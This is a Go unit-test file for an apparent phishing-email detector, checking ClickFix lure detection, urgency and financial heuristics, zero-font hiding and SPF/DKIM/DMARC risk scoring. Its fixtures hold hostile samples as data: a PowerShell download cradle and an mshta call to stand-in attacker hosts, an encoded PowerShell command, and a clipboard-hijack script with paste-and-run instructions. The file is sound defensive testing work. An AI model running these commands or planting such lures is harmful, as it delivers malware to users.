package parser

import (
	"testing"

	"github.com/kennedy-aikohi/jigphish/internal/model"
)

func TestDetectClickFix(t *testing.T) {
	tests := []struct {
		name           string
		body           string
		wantDetected   bool
		wantMinSignals int
	}{
		{
			name: "clipboard hijack + win+r instruction",
			body: `<script>navigator.clipboard.write([new ClipboardItem({"text/plain":
				new Blob(["powershell -enc abc123"], {type: "text/plain"})})]);
				</script><p>Press Win+R and paste to continue.</p>`,
			wantDetected:   true,
			wantMinSignals: 2,
		},
		{
			name:           "fake captcha lure",
			body:           `Complete the CAPTCHA below to prove you're human. Press Win+R, then paste and hit Enter.`,
			wantDetected:   true,
			wantMinSignals: 2,
		},
		{
			name:           "powershell download cradle",
			body:           `iex (New-Object Net.WebClient).DownloadString('http://evil.ru/payload.ps1')`,
			wantDetected:   true,
			wantMinSignals: 1,
		},
		{
			name:           "base64-encoded powershell flag",
			body:           `powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==`,
			wantDetected:   true,
			wantMinSignals: 1,
		},
		{
			name:           "step-by-step paste instructions",
			body:           `Step 1: Copy the command. Step 2: Paste it into the run box. Step 3: Execute.`,
			wantDetected:   true,
			wantMinSignals: 1,
		},
		{
			name:           "lolbin with remote url",
			body:           `mshta https://evil.example.com/payload.hta`,
			wantDetected:   true,
			wantMinSignals: 1,
		},
		{
			name:           "clean newsletter — no signals",
			body:           `Thank you for subscribing. Click here to view the latest deals.`,
			wantDetected:   false,
			wantMinSignals: 0,
		},
		{
			name:           "empty body",
			body:           "",
			wantDetected:   false,
			wantMinSignals: 0,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			detected, signals := detectClickFix(tc.body)
			if detected != tc.wantDetected {
				t.Errorf("detected=%v want=%v (signals: %v)", detected, tc.wantDetected, signals)
			}
			if len(signals) < tc.wantMinSignals {
				t.Errorf("got %d signals, want at least %d: %v", len(signals), tc.wantMinSignals, signals)
			}
		})
	}
}

func TestAnalyzeBodyUrgency(t *testing.T) {
	body := "Action required: your account has been suspended. Verify now. Final notice."
	h := analyzeBody(body)
	if h.UrgencyScore == 0 {
		t.Error("expected non-zero UrgencyScore for urgency-laden body")
	}
	if len(h.Matches) == 0 {
		t.Error("expected at least one match entry")
	}
}

func TestAnalyzeBodyFinancial(t *testing.T) {
	body := "Please review the attached invoice. Wire transfer of $50,000 required. Routing number: 021000021."
	h := analyzeBody(body)
	if h.FinancialScore == 0 {
		t.Error("expected non-zero FinancialScore for financial-laden body")
	}
}

func TestAnalyzeBodyZeroFont(t *testing.T) {
	body := `<span style="font-size:0">hidden text</span><p>Click here.</p>`
	h := analyzeBody(body)
	if !h.ZeroFontDetected {
		t.Error("expected ZeroFontDetected=true for zero-font CSS")
	}
	if h.ObfuscationScore == 0 {
		t.Error("expected non-zero ObfuscationScore")
	}
}

func TestAnalyzeBodyCleanEmail(t *testing.T) {
	body := "Hi Team, please find the project update attached. Best regards, Alice."
	h := analyzeBody(body)
	if h.ClickFixDetected {
		t.Error("expected ClickFixDetected=false for clean email")
	}
	if h.ZeroFontDetected {
		t.Error("expected ZeroFontDetected=false for clean email")
	}
	if h.QRCodeDetected {
		t.Error("expected QRCodeDetected=false for clean email")
	}
}

func TestAssessRiskMCICap(t *testing.T) {
	// Every signal fires simultaneously — MCI must never exceed 100.
	r := model.AnalysisResult{
		Auth: model.AuthAssessment{
			SPFResult:        "fail",
			DKIMResult:       "fail",
			DMARCResult:      "fail",
			FromDomain:       "paypal.com",
			ReturnPathDomain: "evil.ru",
			SPFAligned:       false,
			DKIMAligned:      false,
		},
		BodyHeuristics: model.BodyHeuristics{
			UrgencyScore:       100,
			FinancialScore:     100,
			ZeroFontDetected:   true,
			ClickFixDetected:   true,
			ClickFixSignals:    []string{"sig1", "sig2", "sig3", "sig4", "sig5"},
			QRCodeDetected:     true,
			TyposquatSuspicion: true,
			TyposquatMatches:   []string{"pаypal.com"},
		},
	}
	risk := assessRisk(r)
	if risk.Score > 100 {
		t.Errorf("MCI score %d exceeds cap of 100", risk.Score)
	}
	if risk.Level == "" {
		t.Error("expected non-empty risk Level")
	}
	if risk.Level != "Critical" {
		t.Errorf("expected Critical for max-signal result, got %q", risk.Level)
	}
	if len(risk.MCIBreakdown) == 0 {
		t.Error("expected non-empty MCIBreakdown")
	}
}

func TestAssessRiskLevels(t *testing.T) {
	tests := []struct {
		name      string
		spf       string
		dmarc     string
		wantLevel string
	}{
		{"clean", "pass", "pass", "Low"},
		{"soft fail", "softfail", "none", "Low"},
		{"hard fail", "fail", "fail", "High"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			r := model.AnalysisResult{
				Auth: model.AuthAssessment{
					SPFResult:   tc.spf,
					DMARCResult: tc.dmarc,
				},
			}
			risk := assessRisk(r)
			if risk.Level != tc.wantLevel {
				t.Errorf("got Level=%q want=%q (score=%d)", risk.Level, tc.wantLevel, risk.Score)
			}
		})
	}
}
